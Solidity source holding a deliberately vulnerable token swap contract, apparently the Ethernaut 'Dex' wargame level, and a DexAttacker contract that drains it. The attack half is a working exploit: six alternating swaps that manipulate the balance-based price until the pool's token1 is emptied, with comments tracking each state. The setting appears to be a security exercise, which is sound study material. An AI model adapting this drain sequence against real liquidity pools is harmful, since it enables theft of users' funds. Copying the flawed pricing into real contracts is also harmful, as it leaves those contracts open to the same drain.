// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() Ownable(msg.sender){}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}


pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

/**
 * @title DexAttacker
 * @dev This contract exploits the precision loss vulnerability in the Dex contract.
 */
contract DexAttacker {

    /**
     * @notice Executes the full attack sequence.
     * @dev Before calling this function, you must transfer 10 of token1 and 10 of token2
     * to this contract's address.
     * @param _dexAddress The address of the target Dex contract.
     */
    function attack(address _dexAddress) public {
        IDex dex = IDex(_dexAddress);
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        // Approve the Dex contract to spend an effectively infinite amount of our tokens.
        token1.approve(_dexAddress, type(uint256).max);
        token2.approve(_dexAddress, type(uint256).max);

        // -- Begin Swap Sequence --

        // Swap 1: (Initial: 10 T1, 10 T2) -> Swapping 10 T1
        // End State: 0 T1, 20 T2
        dex.swap(address(token1), address(token2), 10);
        
        // Swap 2: Swapping 20 T2
        // End State: 24 T1, 0 T2
        dex.swap(address(token2), address(token1), 20);

        // Swap 3: Swapping 24 T1
        // End State: 0 T1, 30 T2
        dex.swap(address(token1), address(token2), 24);

        // Swap 4: Swapping 30 T2
        // End State: 41 T1, 0 T2
        dex.swap(address(token2), address(token1), 30);

        // Swap 5: Swapping 41 T1
        // End State: 0 T1, 65 T2
        dex.swap(address(token1), address(token2), 41);

        // Final Swap: Drain all of Token1 from the Dex.
        // We swap 45 of our 65 Token2 to get the remaining 110 Token1.
        dex.swap(address(token2), address(token1), 45);
    }
}